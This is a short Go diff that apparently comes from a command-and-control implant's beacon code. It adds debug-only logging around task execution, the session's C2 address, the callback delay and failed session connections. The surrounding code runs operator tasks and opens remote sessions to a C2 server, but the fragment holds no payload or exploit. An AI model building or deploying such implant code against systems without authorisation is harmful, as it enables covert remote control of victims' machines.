@@ -345,7 +345,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 
 	for _, task := range tasks.Tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] execute task %#v", task)
+		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
@@ -414,12 +414,23 @@ func openSessionHandler(data []byte) {
 		log.Printf("[beacon] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] open session -> %v", openSession.C2S)
+	// {{end}}
 	if openSession.Delay != 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
+		// {{end}}
 		time.Sleep(time.Duration(openSession.Delay))
 	}
 
 	go func() {
 		connection := transports.StartConnectionLoop(openSession.C2S)
+		// {{if .Config.Debug}}
+		if connection == nil {
+			log.Printf("[beacon] failed to open session!")
+		}
+		// {{end}}
 		if connection != nil {
 			sessionMainLoop(connection)
 		}
